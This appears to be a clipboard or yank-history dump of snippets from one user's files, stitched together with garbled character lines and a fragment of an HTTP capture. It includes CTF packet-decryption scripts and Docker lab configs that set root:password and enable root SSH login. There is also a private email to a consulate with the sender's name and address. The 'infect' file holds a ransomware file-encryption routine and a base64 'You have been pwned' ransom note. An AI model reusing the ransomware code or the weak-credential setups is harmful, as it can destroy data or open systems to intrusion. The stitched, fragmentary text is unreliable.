	Content-Type: text/html; charset=iso-8859-1
	
	<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
	<html><head>
	<title>301 Moved Permanently</title>
	</head><body>
	<h1>Moved Permanently</h1>
	<p>The document has moved <a href="http://canlibets10.com/EV990701zD/">here</a>.</p>
	</body></html>
	GET /EV990701zD/ HTTP/1.1
	Host: canlibets10.com
	
	[15988 bytes missing in capture file]
JR
3HRHJH
RHJRrr
#
E
H
3
h
#


3
#
E
3
w
h
E
W
#
H
#
w
H
#
w
#
#


E
3
H
h
E
E
3
W
#
#
h
W
w


H
W
H
#
W
3
#
H
w
H
E
#
h
#


H
#
3
#
#
#
#
W
#
#
W
W
#
H
#
w
H
w


3
h
3
h
3
h
3
W
h
#
H
h
w
H
h
h
w


w
#
#
w
h
3
h
W
#


rRWRJ1
1E1JRE
#RJJRH
JW13H1
HE#WwK
WK1RRW
#3EH1r
J#rRKw
EWER#3
EHw1W3
RrwJ#J
WJH31H
H
H
w
h
#
#
H
#


3
#
W
W
H
W
E
E
#
H
W
#
#
3
#
0a8b5855deef546aef567d18a1e382ba|file:///home/neo/247ctf/networking/sol_seq.py|4|5|V|python
	pcap2 = rdpcap("chall-i2.pcap")
	pcap3 = rdpcap("chall-i2.pcap")
a67129998549a280b85a4401599e7c27|file:///home/neo/247ctf/networking/sol_seq.py|4|34|v|python
	zip(pcap1, pcap2, pcap3)
79a67aaf749acf11f69753a963dab193|file:///home/neo/247ctf/networking/sol_seq.py|8|5|V|python
	    print(p.load)
bd4acdcf836d72b15202fc3c79eefe28|file:///home/neo/247ctf/networking/sol_seq.py|3|1|V|python
	pcap = rdpcap("merged.pcap")
015862c9d88ace9b7ddec2e9764948ea|file:///home/neo/247ctf/networking/sol_seq.py|4|1|V|python
	packets = PacketList([p for p in pcap if Raw in p])
772008c56e02e36d2fd3bc3d0c7a48af|file:///home/neo/247ctf/networking/sol_seq.py|8|2|V|python
	    print(p.options)
b4169b95f433531d54bea4c45f82bebd|file:///home/neo/247ctf/networking/sol_seq.py|9|5|V|python
	    # cont += p.load
4f1117c24e5a91f46d43915797124b7a|file:///home/neo/247ctf/networking/sol_seq.py|7|1|V|python
	for p in packets:
41738fac1ead56a0e9f0d61cc7edfe8b|file:///home/neo/247ctf/networking/sol_seq.py|8|14|v|python
	int(p[TCP].options[3][1].hex(), 16)
8bab36c89cb69ed0f44b0d6c9a7ad91e|file:///home/neo/247ctf/networking/sol_seq.py|8|1|V|python
	# sequence = int(p[TCP].options[3][1].hex(), 16)
5bf1d24e85133c478b9707ae660c8998|file:///home/neo/247ctf/networking/sol_seq.py|7|27|v|python
	p: int(p[TCP].options[3][1].hex(), 16))
f1c4afd27fe5fd3f4e25bad6fbc44b56|file:///home/neo/247ctf/networking/sol_seq.py|12|1|V|python
	packets.sort(key = lambda p: int(p[TCP].options[3][1].hex(), 16))
	toolz.unique(packets, key = lambda p: int(p[TCP].options[3][1].hex(), 16))
f427da75c11b8e9eb4d2b587fe0961d7|file:///home/neo/247ctf/networking/sol_seq.py|20|8|V|python
	    # sequence = int(p[TCP].options[3][1].hex(), 16)
	    # print(sequence)
4af68fd215bf026e8784ecae9e87b771|file:///home/neo/247ctf/networking/sol_seq.py|19|1|V|python
	for p in packets1:
1f600bb067fb0bfddfc58ec3c5e8538c|file:///home/neo/247ctf/networking/sol_seq.py|19|1|V|python
	for p in packets1:
	    cont += p.load
c09814bfe795d3b1ee143b981890e28c|file:///home/neo/247ctf/networking/sol_zeroes.py|15|1|V|python
	for i in range(10):
47a73453b256e5c371f8f5b099bbcfc8|file:///home/neo/247ctf/networking/sol_zeroes.py|21|1|V|python
	        if f:
	            f = False
	            cipher = AES.new(key, AES.MODE_CCM, iv) 
	            cipher.update(data)
	        else:
	            cipher.update(data)
fd702348ddec5561318593402fb7eec8|file:///home/neo/247ctf/networking/sol_zeroes.py|16|14|V|python
	    # print(i)
	    # print(packets[i].show())
0b0fb5952c9a31d8a449dcc0134de6cf|file:///home/neo/247ctf/networking/sol_zeroes.py|16|5|V|python
	    addr = packet.addr2
	    if addr == '00:0f:00:54:3b:d6':
b2ffd4a41e2f8080de58e95d7689371d|file:///home/neo/247ctf/networking/sol_zeroes.py|16|5|V|python
	    print(packet.show())
5fd59577e33bec659c21bc3b13655b2c|file:///home/neo/247ctf/networking/sol_zeroes.py|17|5|V|python
	    print("Dst:", dst)
644f4fe8ce3ca9b083d674aca4a249d9|file:///home/neo/247ctf/networking/sol_zeroes.py|10|1|V|python
	mac = bytes.fromhex('000f00543bd6')
f06e93ef6e7871b20f8246e1272acfc5|file:///home/neo/247ctf/networking/sol_zeroes.py|11|1|V|python
	cipher = ARC4.new(key)
7a5e12b2a95e959367157ceef153b281|file:///home/neo/247ctf/networking/sol_zeroes.py|8|54|v|python
	00:0f:00:54:3b:d6
bce8e71850dedd2fbd8c1e4a98e9e2b4|file:///home/neo/247ctf/networking/sol_zeroes.py|6|1|V|python
	iv = b'\x00' * 7 + b'\x01'
44b1a2338cb65609b31eaec3906a96c3|file:///home/neo/247ctf/networking/sol_zeroes.py|10|5|v|python
	 b'\x00' * 7 + b'\x01'
f17509b66aa405db1f2b289d134ae512|file:///home/neo/247ctf/networking/sol_zeroes.py|7|73|^v|python
	and p.addr3 == '00:e0:4c:36:01:e0' a
0ecc4eb15eb9fd36582dca430be9876c|file:///home/neo/247ctf/networking/sol_zeroes.py|12|31|v|python
	 key
b401a1d906c6eb9aa6613d15b7590810|file:///home/neo/247ctf/networking/sol_zeroes.py|15|5|V|python
	    print(packet.addr3)
235ccda83713fd5528108374d7aa80ab|file:///home/neo/247ctf/networking/sol_zeroes.py|10|16|v|python
	b'\x00'
2855a857a0f0f470fe2f7b2f91e278d7|file:///home/neo/247ctf/networking/sol_zeroes.py|10|1|V|python
	counter = 
53c319495a681a18e925bdafc6c69cd8|file:///home/neo/test.txt|8|1|V|text
	f7de6170
9fbc1ac9d7bc18e7b6b167c94cf7b6b7|file:///home/neo/test.txt|8|1|V|text
	f7e7b3c6
74a63dcf0af29e8ff8f1f17867681748|file:///home/neo/test.txt|9|1|V|text
	f7f40352
32a5fa8132c8f58af486103cb4517e15|file:///home/neo/247ctf/networking/sol_zeroes.py|11|1|V|python
	print(iv + 1)
8a1be27a5388527c57c4c3bd2978123b|file:///home/neo/247ctf/networking/sol_zeroes.py|5|1|V|python
	macbytes = binascii.unhexlify(addr.replace(b':', b''))
bb15db77bc5c76485885580ccbd50a81|file:///home/neo/247ctf/networking/sol_zeroes.py|16|5|V|python
	    print(packet.PN0)
d6b9ac542cb9f492f86b328099dc308a|file:///home/neo/247ctf/networking/sol_zeroes.py|14|1|V|python
	    print(packet.show2())
22bf73695c35e8a0a65853ad635fa8d0|file:///home/neo/247ctf/networking/sol_zeroes.py|16|5|V|python
	    print(addr)
00009aaec74b67f104efc8506b24ee9c|file:///home/neo/247ctf/networking/sol_zeroes.py|17|5|V|python
	    print(macbytes)
8bf6a2b83d89e8ffef0a38f1cf9c4a9d|file:///home/neo/247ctf/networking/sol_zeroes.py|12|1|V|python
	cipher = AES.new(key, AES.MODE_CCM, iv)
ac6e46ab44d6bb0c703c68667f6cc3e1|file:///home/neo/247ctf/networking/sol_zeroes.py|20|5|V|python
	    if i == 5:
	        break
552c9ec49d12e343ef610e16acc0cecd|file:///home/neo/247ctf/networking/sol_zeroes.py|11|1|V|python
	# iv = mac + bytes.fromhex('000000000000')
90521ddececad11a725294d230f66d63|file:///home/neo/247ctf/networking/sol_zeroes.py|18|1|V|python
	    # dst = packet.addr1
00442db4b35234c2c4fec1bf1e9e2094|file:///home/neo/247ctf/networking/sol_zeroes.py|21|5|V|python
	    print('-'*50)
16a07e211ad57e54c4a8d186fa689e43|file:///home/neo/247ctf/networking/sol_zeroes.py|17|5|V|python
	    print(len(iv))
1c8a46259210c36f96f36a506e0b81bb|file:///home/neo/247ctf/networking/sol_zeroes.py|20|13|V|python
	    print(iv)
	    print(len(iv))
09a63d160de37aa55c5d6baad63b18cb|file:///home/neo/247ctf/networking/sol_zeroes.py|17|5|V|python
	    # print(len(iv))
d25184e90c95d9e4c98c2ab50c9c3ed3|file:///home/neo/247ctf/networking/sol_zeroes.py|1|1|V|python
	from scapy.all import *
	from Crypto.Cipher import AES
	from Crypto.Util import Counter
	import binascii
	import struct
	
	key = b'\x00' * 16
	pcap = rdpcap("00ps.pcap")
	packets = PacketList([p for p in pcap if p.addr2 == '00:0f:00:54:3b:d6' and hasattr(p, 'data')])
	counter = Counter.new(8 * 16, initial_value=1)
	
	for i,packet in enumerate(packets):
	    print(packet.show2())
	    if i == 5:
	        break
44d7673b588fba234c1e058bdb58ed2b|file:///home/neo/247ctf/networking/sol_zeroes.py|17|5|V|python
	    print(pn)
f9b8dafcc670768f806f97e1ba10010a|file:///home/neo/247ctf/networking/sol_zeroes.py|16|1|V|python
	    pn = struct.pack("<Q", packet.PN0)[:-2]
47e4992d59d7511aafd27a710b97acf6|file:///home/neo/247ctf/networking/sol_zeroes.py|19|1|V|python
	    macbytes = binascii.unhexlify(addr.replace(b':', b''))[::-1]
693ad12d84feb9898ad20720560fd49b|file:///home/neo/247ctf/networking/sol_zeroes.py|13|5|V|python
	    # print(packet.show2())
	    # if i == 5:
	    #     break
9e83e9013f3c62b9fe12c2637feb5695|file:///home/neo/247ctf/networking/sol_zeroes.py|18|1|V|python
	    pn0 = packet.PN0
403c56b95f916a266ecef9c48446aa5f|file:///home/neo/247ctf/networking/sol_zeroes.py|21|5|V|python
	    append(packet.PN2, packet.PN3, packet.PN4, packet.PN5)
74163a4788db05adc7bd4775c385cafe|file:///home/neo/247ctf/networking/sol_zeroes.py|20|1|V|python
	    append(packet.PN1)
389cc835b799824cde5030f8e98493cb|file:///home/neo/247ctf/networking/sol_zeroes.py|19|1|V|python
	    pn.append(packet.PN0)
019e85a4a4709562553b55d7ec8847f0|file:///home/neo/247ctf/networking/sol_zeroes.py|16|5|V|python
	    # pn = struct.pack("<Q", packet.PN0)[:-2]
	    # pn = struct.pack(">Q", packet.PN0)[2:]
c98fe48c25c70f0f63ee734baa268e4b|file:///home/neo/test.txt|7|1|V|text
	aaaaaaaa
	f7df3830
	f7f40352
3e0675b8990bf40ac26f6ff037649bc3|file:///home/neo/cyberranges/work/mitre/easy13/Dockerfile|5|34|V|dockerfile
	    # apt-get install -y wget build-essential && \
	#     wget https://www.sudo.ws/sudo/dist/packages/1.8.27/sudo_1.8.27-1_ubu1804_amd64.deb && \
	#     dpkg -i sudo_1.8.27-1_ubu1804_amd64.deb
33beed938526e7e600b01ce12a37d01c|file:///home/neo/cyberranges/work/mitre/easy13/Dockerfile|5|16|v|dockerfile
	THEPASSWORDYOUCREATED
fde9c7d3ceb1fb56b20676054de2ec4b|file:///home/neo/cyberranges/work/mitre/easy13/client/Dockerfile|6|1|V|dockerfile
	RUN systemctl enable ssh && systemctl start ssh
e8fb8a590cdc20529af3cc3eed2376f5|file:///home/neo/cyberranges/work/mitre/easy13/client/Dockerfile|4|1|V|dockerfile
	    apt-get install openssh-client
0c63ef9225db6aad41ef9a7c11833042|file:///home/neo/cyberranges/work/mitre/easy13/docker-compose.yml|3|3|v|yaml
	container1
0cac5868d415cd754cea61160882bb2f|file:///home/neo/cyberranges/work/mitre/easy13/docker-compose.yml|4|12|v|yaml
	sshtest
01ac277d34a0d993c887339e43a47080|file:///home/neo/cyberranges/work/mitre/easy13/docker-compose.yml|11|3|v|yaml
	container2
4b5327e198e722a267782dca225439df|file:///home/neo/cyberranges/work/mitre/easy13/docker-compose.yml|13|5|V|yaml
	    dockerfile: client/Dockerfile
241c0b3d169fb306c1f75018d81aab24|file:///home/neo/cyberranges/work/mitre/easy13/docker-compose.yml|5|1|V|yaml
	    # build: .
860d89a38627f5f28be98ba38b4c0da3|file:///home/neo/cyberranges/work/mitre/easy13/client/Dockerfile|9|1|V|dockerfile
	# RUN useradd -m hacker && echo 'hacker ALL=(ALL,!root) /bin/bash' >> /etc/sudoers
f11d336ce02ffb47d2083fe81e28242f|file:///home/neo/cyberranges/work/mitre/easy13/client/Dockerfile|9|1|V|dockerfile
	# RUN echo "hacker:hacker" | chpasswd
3f7657e964056169fcc335df512aee04|file:///home/neo/cyberranges/work/mitre/easy13/client/Dockerfile|9|1|V|dockerfile
	# USER hacker
063b67bb3fca394cf8b1ccbdcdfb66b9|file:///home/neo/cyberranges/work/mitre/easy13/docker-compose.yml|4|12|v|yaml
	rastasheep/ubuntu-sshd
f8473d50766667610a596edd0617776d|file:///home/neo/cyberranges/work/mitre/easy13/server/Dockerfile|1|1|V|dockerfile
	FROM ubuntu:16.04
	
	RUN apt-get update && apt-get install -y openssh-server
	RUN mkdir /var/run/sshd
	RUN echo 'root:password' | chpasswd
	RUN sed -i 's/#*PermitRootLogin prohibit-password/PermitRootLogin yes/g' /etc/ssh/sshd_config
	
	# SSH login fix. Otherwise user is kicked off after login
	RUN sed -i 's@session\s*required\s*pam_loginuid.so@session optional pam_loginuid.so@g' /etc/pam.d/sshd
	
	ENV NOTVISIBLE "in users profile"
	RUN echo "export VISIBLE=now" >> /etc/profile
	
	EXPOSE 22
	CMD ["/usr/sbin/sshd", "-D"]
9973d62d24e1d098ebbc828eb34a4a11|file:///home/neo/cyberranges/work/mitre/easy13/client/Dockerfile|7|1|V|dockerfile
	RUN eval $(ssh-agent)
233b3f99a557a821890b57e1f935cb4c|file:///home/neo/cyberranges/work/mitre/easy13/client/Dockerfile|11|1|V|dockerfile
	CMD /bin/bash
fc1a18b08de7a1742ec49007d9ebf75e|file:///home/neo/cyberranges/work/mitre/easy13/docker-compose.yml|4|12|v|yaml
	rastasheep
2341bda2ba651d1a968e5d04f6cbac4a|file:///home/neo/cyberranges/work/mitre/easy13/docker-compose.yml|4|12|v|yaml
	/ubuntu-sshd
574ffbb745f00001c4b26f1a6b46e9a9|file:///home/neo/cyberranges/work/mitre/easy13/docker-compose.yml|17|1|V|yaml
	    stdin_open: true
	    tty: true
f96f01273e8f5123054eb6022b422eb2|file:///home/neo/cyberranges/work/loganalysis/app/log.py|10|1|V|python
	        return super().format(record)
16764048e68e5981878d7ef8bde46ad0|file:///home/neo/.local/lib/python3.7/site-packages/shadowd/connector.py|20|1|V|python
	import ConfigParser
dd446e2586ce0dd96bb6a170a2b13d09|file:///home/neo/cyberranges/work/loganalysis/app/app.py|8|1|V|python
	from log import logger
7e3ee9918f4b28e786bfeb901a34efef|file:///home/neo/cyberranges/work/loganalysis/app/app.py|69|5|V|python
	    logger.info("home")
6986a061ecb626218969ec3415fe4b8e|file:///home/neo/.local/lib/python3.7/site-packages/shadowd/connector.py|193|17|V|python
	                print(data)
796be4a5a3bb0ba4dbe1c1579e7cb24a|file:///home/neo/cyberranges/work/wafanalysis/Dockerfile|1|13|v|dockerfile
	3.8-alpine
60a7be999ec2c8f9a8fe3ecd2fdcc7ae|file:///home/neo/.local/lib/python3.7/site-packages/shadowd/connector.py|192|17|V|python
	                data = output
451e6c3fe44937038f607d1026b6bc26|file:///home/neo/.local/lib/python3.7/site-packages/shadowd/connector.py|174|17|V|python
	                print(json_data)
ebf5ce3198c34309be24d183c4c180cc|file:///home/neo/.local/lib/python3.7/site-packages/shadowd/connector.py|172|17|V|python
	                print(host, port)
4036aa53a7da623e76b77a21d47f6a11|file:///home/neo/.local/lib/python3.7/site-packages/shadowd/connector.py|162|25|V|python
	                        print('test')
aa8ad2bdd9a9714eb9e4d11878ad1f3d|file:///home/neo/.local/lib/python3.7/site-packages/shadowd/connector.py|174|17|V|python
	                json_data=str(json_data)
bc2b4c27a3ed7627ee62d580d012d314|file:///home/neo/cyberranges/work/wafanalysis/Dockerfile|2|1|V|dockerfile
	COPY app/ /app
95b37c8848136411584fa5c141b16662|file:///home/neo/cyberranges/work/wafanalysis/Dockerfile|3|1|V|dockerfile
	COPY shadowd_python/ /app/shadowd_python
a1169981ef05aa90fecd952b3393f95b|file:///home/neo/cyberranges/work/wafanalysis/app/app.py|24|1|V|python
	    # logger.info('')
e8951bf3de8cce8f90f286cce546e865|file:///home/neo/cyberranges/work/wafanalysis/app/log.py|11|1|V|python
	        # return super(format(record))
88085047cf264b19bf8dfd00fa458eaa|file:///home/neo/cyberranges/work/waf-notes|5|1|V|
	sudo ./shadowdctl exec web ./app/console -s
fda5b7b1a4bfcb11c58ce8f19438a829|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|45|1|V|tex
	\subsubsection{Example}
0a52730597fb4ffa01fc117d9e71e3a9|file:///home/neo/Documents/diplomatiki/auth.js/conclusion.tex|22|32|v|tex
	Example
ec48856fb6c40a830f8e32b1bbabded4|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|14|1|V|bib
	@misc{keybase-login,
	  title = {Keybase.io login API documentation},
	  howpublished = {\url{https://keybase.io/docs/api/1.0/call/login}}
	}
	
eeb55fc843427af52ac35bd96e5e44a2|file:///tmp/neomutt-neo-1000-2516-592809036742784359|1|1|V|mail
	From neophytos.christou19@gmail.com Tue Sep  1 10:49:49 2020
	Date: Tue, 1 Sep 2020 10:49:49 +0300
	From: Neophytos Christou <neophytos.christou19@gmail.com>
	To: consularnicosia@state.gov
	Subject: Question about re-applying for visa
	Message-ID: <20200901074944.6cwttc75apn3dres@neo>
	MIME-Version: 1.0
	Content-Type: text/plain; charset=us-ascii
	Content-Disposition: inline
66dd88eb282be516dc5d592082d0eecd|file:///tmp/neomutt-neo-1000-169347-15896269587633209920|1|1|V|mail
	Hello,
	
	I am a Cypriot citizen and I will be joining a PhD program in the US in
	January. I should originally have started this August, but I had to
	defer my admission due to the current pandemic. However, I have already
	completed the SEVIS I-901 form and paid both the fee for that and for
	scheduling an appointment for a visa at the US Embassy.
	
	If I understand correctly, I will be able to re-apply for a visa and
	complete the I-901 form using my new I-20 without paying the fee again?
	What is the process for doing this?
	
	Also, is there a limit on how soon I can re-apply for a visa for
	January? I am receiving the new I-20 form soon and I would like to get
	it sorted as soon as possible.
	
	Thank you,
	Neophytos Christou
6040538dd3c9728221d5d2b47db32f54|file:///home/neo/Documents/moz-changes.txt|3|37|v|text
	 (not rsa‚Ä¶)
8994e7922c2c01076e7c959c79a09c24|file:///home/neo/Documents/moz-changes.txt|4|17|v|text
	<- had to put different number as ckm define!
61bd217d378b67af1d886d07986b9ca7|file:///home/neo/Documents/moz-changes.txt|10|21|v|text
	 - RSA, not finished
16190e204345b7003798b187c20d0bc6|file:///home/neo/Documents/moz-changes.txt|13|20|v|text
	- more things, rsa etc
d4d27e4db38448815338144b33d1f53e|file:///home/neo/Documents/moz-changes.txt|14|20|v|text
	 - more things‚Ä¶
f557eda2d0efac2c9dacf30ce1b0826f|file:///home/neo/Documents/moz-changes.txt|16|20|v|text
	 - more things, tests
95f5c367d91a27ed5e8443a0f3b91eb1|file:///home/neo/Documents/moz-changes.txt|18|14|v|text
	 <‚Äî Length
c0f9bdbc32bf74ff0c784a49e799b576|file:///home/neo/Documents/moz-changes.txt|21|15|v|text
	 scrypt as shaxxx ???
0d3a877022184d377dab5b66b108a082|file:///home/neo/Documents/moz-changes.txt|22|17|v|text
	 <‚Äî flags
ac78ed262e86d83b6509f365ad7d6b0c|file:///home/neo/Documents/moz-changes.txt|23|22|v|text
	order, slotlist<----
455c86f50b54ebb7aea1c67d8f5116fe|file:///home/neo/Documents/moz-changes.txt|24|17|v|text
	<‚Äî definitions of functions in sha512.c
967cc4cf2221a6bfb065e3bbb7c04373|file:///home/neo/Documents/moz-changes.txt|25|18|v|text
	<‚Äî Lengths, context
ded88197b12254a2a4c23d70b6ee6fae|file:///home/neo/Documents/moz-changes.txt|26|21|v|text
	 <‚Äî known hash, copied sha256, also tests with known hash, didnt change everything yet
8b5932e824928fc449520f652a8cea03|file:///home/neo/Documents/moz-changes.txt|31|17|v|text
	 <‚Äî changed ed25519sign_update to support 64 more bytes to be copied in ctx->u.b
a93779410cc0108bc9304f1e1305ac43|file:///home/neo/Documents/moz-changes.txt|34|34|v|text
	<‚Äî MAYBE NEED MORE THAN 512
2dad4a4f771586f583ad7e3db0f7f777|file:///home/neo/Documents/moz-changes.txt|35|29|v|text
	<‚Äî numbers MAYBE NEED MORE THAN 512
067328dd3309f4a9a51d01b285b659a1|file:///tmp/neomutt-neo-1000-170336-12660058734597301504|2|71|v|mail
	 I can also
deb033bcb10e4dbf20e009be55615f7a|file:///tmp/neomutt-neo-1000-170336-12660058734597301504|3|70|V|mail
	maybe try and add the zip with the source in one of the srec repos, just
	to have it somewhere. 
dadd6c7fd0b1dac603ce70c87e1205be|file:///media/neo/Storage/ctf/dirsearch/dirs.txt|1|1|V|text
	# directory-list-2.3-small.txt
	#
	# Copyright 2007 James Fisher
	#
	# This work is licensed under the Creative Commons 
	# Attribution-Share Alike 3.0 License. To view a copy of this 
	# license, visit http://creativecommons.org/licenses/by-sa/3.0/ 
	# or send a letter to Creative Commons, 171 Second Street, 
	# Suite 300, San Francisco, California, 94105, USA.
	#
	# Priority ordered case sensative list, where entries were found 
	# on atleast 3 different hosts
	#
	
b6e9580c2991b1c2024c1b956ce28b06|file:///home/neo/kaleidoscope/toy.cpp|101|1|V|cpp
	  virtual Value *codegen();
7d9e1895ca7f510df8958f6e182b95d1|file:///home/neo/kaleidoscope/toy.cpp|165|1|V|cpp
	
	static LLVMContext TheContext;
	static IRBuilder<> Builder(TheContext);
	static std::unique_ptr<Module> TheModule;
	static std::map<std::string, Value *> NamedValues;
	
	Value *LogErrorV(const char *Str){
	    LogError(Str);
	    return nullptr;
	}
375cc110fa4d004b63c8cd3a6ff35803|file:///home/neo/cyberranges/work/wafanalysis/app/static/82a9d051916e08825a8410cd89bb1b13/secret.html|1|1|V|html
	<h1>ADMINISTRATORS ONLY</h1>
	<h2>NEW ACCESS CONTROL FEATURE</h2>
	<p>Administrators, you can now promote other users to the administrator privilege by typing <b>/makeAdmin?user=username</b> after the website URL and replacing username with the username of the user you wish to promote</p>
bba73b8816f44eefb16fc4e67a700116|file:///home/neo/247ctf/networking/sol_zeroes.py|28|5|V|python
	    print(iv)
	    break
3d7f7ea0f117faacbca0b88f6c2cc31d|file:///home/neo/247ctf/networking/sol_zeroes.py|27|5|V|python
	    iv = b'\x00' + macbytes + pn
	    cipher = AES.new(key, AES.MODE_CCM, iv)
c6e528ca6fd8b7044150a38a95c5b29d|file:///home/neo/247ctf/networking/sol_zeroes.py|27|9|V|python
	    print(macbytes)
	    break
9b3594c049aabcfd2d7420c7b2b0bfd0|file:///home/neo/247ctf/networking/sol_zeroes.py|25|5|V|python
	    # macbytes = binascii.unhexlify(addr.replace(b':', b''))[::-1]
c6d06178bf737615251041e75f262650|file:///home/neo/247ctf/networking/sol_zeroes.py|31|10|v|python
	 = packet.addr2.encode()
e25cbcc1d8ade70b277eb947efaeec73|file:///home/neo/247ctf/networking/sol_zeroes.py|32|13|v|python
	packet.addr2.encode()
a789d7554612a0e9186cd8526876e2c5|file:///home/neo/247ctf/networking/sol_zeroes.py|20|5|V|python
	    print(packet.SC)
3d4eac6c86617b2fbf9bfc9a1f14610b|file:///home/neo/247ctf/networking/sol_zeroes.py|15|5|V|python
	    print(packet.FCfield)
ae5afd97913688a2b4035bf599ca5390|file:///home/neo/247ctf/networking/sol_zeroes.py|32|1|V|python
	    macbytes = binascii.unhexlify(addr2.replace(b':', b''))
f2f4a8cc0295672b1236b0ca56bf8a43|file:///home/neo/247ctf/networking/sol_zeroes.py|37|9|V|python
	    print(aad)
	    print(len(aad))
	    break
56ac44f865144816dbc9e4afaa67edb5|file:///home/neo/247ctf/networking/sol_zeroes.py|19|5|V|python
	    # if i == 5:
	    #     break
4908644b9c63bf5eacc34bf7e9a3208d|file:///home/neo/cyberranges/work/infect|172|32|v|python
	LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiAgICAgICAgICBfICAgICAgICAgIF8gICAgICAgICAgICAgICBfICAgICAgICAgCiAgICAgICAgIC9cIFwgICAgICAvXCBcICAgICAgICAgICAgIC9cIFwgICAgICAgCiAgICAgICAgLyAgXCBcICAgIC8gIFwgXCAgICAgICAgICAgLyAgXCBcX19fXyAgCiAgICAgICAvIC9cIFwgXCAgLyAvXCBcIFwgICAgICAgICAvIC9cIFxfX19fX1wgCiAgICAgIC8gLyAvXCBcX1wvIC8gL1wgXCBcICAgICAgIC8gLyAvXC9fX18gIC8gCiAgICAgLyAvIC9fLyAvIC9cL18vL19cIFwgXCAgICAgLyAvIC8gICAvIC8gLyAgCiAgICAvIC8gL19fXC8gLyAgIF9fXF9fXyBcIFwgICAvIC8gLyAgIC8gLyAvICAgCiAgIC8gLyAvX19fX18vICAgLyAvXCAgIFwgXCBcIC8gLyAvICAgLyAvIC8gICAgCiAgLyAvIC9cIFwgXCAgICAvIC9fL19fX19cIFwgXCBcIFxfXy8gLyAvICAgICAKIC8gLyAvICBcIFwgXCAgL19fX19fX19fX19cIFwgXCBcX19fXC8gLyAgICAgIAogXC9fLyAgICBcX1wvICBcX19fX19fX19fX19fX1wvIFwvX19fX18vICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgIF9fXyBfIF9fIF8gICBfIF8gX18gfCB8XyBfX18gIF8gX18gICAgICAgICAgCiAgICAvIF9ffCAnX198IHwgfCB8ICdfIFx8IF9fLyBfIFx8ICdfX3wgICAgICAgICAKICAgfCAoX198IHwgIHwgfF98IHwgfF8pIHwgfHwgKF8pIHwgfCAgICAgICAgICAgIAogICAgXF9fX3xffCAgIFxfXywgfCAuX18vIFxfX1xfX18vfF98ICAgICAgICAgICAgCiAgICAgICAgICAgICAgfF9fXy98X3wgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgXG0vICBZb3UgaGF2ZSBiZWVuIHB3bmVkICAgXG0vCiAgICAgIAogICAgICBGb3IgbW9yZSBpbmZvcm1hdGlvbiBwbGVhc2UgZ28gCiAgICAgICAgICAgIHRoZSBmb2xsb3dpbmcgbGluazoKICAgICAgICAgCiAgICAgICAgIGh0dHA6Ly8xOTIuMTY4LjEyNS4xMDA6NTAwMAogICAgCiAgICAgICAgICAgICBXaXRoIExvdmUgUjNEIFwhXCFcIQogICAgCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoK
24e38000e81e119d595e0b37100453b4|file:///home/neo/cyberranges/work/infect|5|1|V|python
	from Crypto.Cipher import AES
	from Crypto.Hash import SHA256
c7940557e8a34423b821c41094f15c8a|file:///home/neo/cyberranges/work/infect|61|1|V|python
	def encrypt(key, filename):
		chunksize = 64*1024
		outputFile = str(filename)+".R3D-cryptor"
		filesize = str(os.path.getsize(filename)).zfill(16)
		IV = Random.new().read(16)
	
		encryptor = AES.new(key, AES.MODE_CBC, IV)
		try:
			with open(filename, 'rb') as infile:
				with open(outputFile, 'wb') as outfile:
					outfile.write(filesize.encode('utf-8'))
					outfile.write(IV)
	
					while True:
						chunk = infile.read(chunksize)
	
						if len(chunk) == 0:
							break 
						elif len(chunk) % 16 != 0:
							chunk += b' ' * (16 - (len(chunk) % 16))
	
						outfile.write(encryptor.encrypt(chunk))
8dcd11c79b16ee7c280858724bf8b6fb|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|7|31|v|python
	-cryptor
2f87ac04249f43555e6b9da69aef5cb3|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|9|2|V|python
		IV = Random.new().read(16)
7ff4b03006d2fd188110b72d44267207|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|10|2|v|python
	encryptor
df999bc9c22b4014b3bac19073f32337|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|14|17|V|python
					outfile.write(filesize.encode('utf-8'))
					outfile.write(IV)
5a8f4fa2aeab5431888ee8a18ce3bcea|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|22|36|v|python
	chunk
8f3caec8faa0f5db8bea819d2bdefde2|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|23|1|V|python
	decrypt( ,'./flag.txt.R3D-cryptor', )
636a7bf1f27237f9caf2947a4e38135d|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|8|13|v|python
	str(os.path.getsize(filename)).zfill(16)
37f92a423db2ec04988465ed8e3ff432|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|7|20|V|python
		outputFile = str(filename)+".decrypted"
		filesize = len(data)
3d9368f8357063a6ec5ba52733b3979d|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|10|1|V|python
			with open(filename, 'rb') as infile:
				with open(outputFile, 'wb') as outfile:
8ab49d39d0f7ba06aa13fb0a950560e7|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|11|29|v|python
	infile.read(chunksize)
fee3be5d772cd033f32a3f41b88b9bcd|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|7|2|V|python
		outputFile = str(filename)+".decrypted"
a64a198e93c40fc767e31aee44e7758e|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|21|6|v|python
	outfile.write
64f5875bdbdf1d4355f0001a2ee761de|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|12|2|V|python
				with open(outputFile, 'wb') as outfile:
c04e530d9b6eff18677c895698d683a3|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|6|17|v|python
	64*1024
6dd81f392c39995b96f26e116a206b0d|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|12|42|V|python
	        with open(filename, 'rb') as infile:
	            while True:
